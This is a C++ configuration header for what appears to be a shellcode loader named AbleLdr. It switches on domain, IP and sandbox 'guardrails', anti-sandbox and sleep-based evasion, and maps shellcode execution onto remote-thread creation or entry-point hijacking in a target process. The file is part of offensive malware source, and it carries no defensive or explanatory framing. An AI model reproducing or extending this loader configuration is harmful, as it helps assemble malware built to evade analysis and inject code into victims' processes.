#ifndef ABLELDR_CONFIG_HPP
#define ABLELDR_CONFIG_HPP

// Guardrails
#define DOMAIN_CHECK 1
#define IP_CHECK 1
#define SANDBOX_CHECK

// Evasion
#define ANTI_SANDBOX_ENABLED 1
#define SLEEP_ENABLED 1
#define SLEEP_METHOD 1

// Execution Methods
#define CONFIG_EXECUTION_METHOD 1

#if CONFIG_EXECUTION_METHOD == 1
#define ExecuteShellcode(phandle, shellcode) Execute::CreateRemoteThread(phandle, shellcode);
#elif CONFIG_EXECUTION_METHOD == 2
#define ExecuteShellcode(phandle, shellcode) Execute::HijackEntryPoint(phandle, shellcode);
#endif

#endif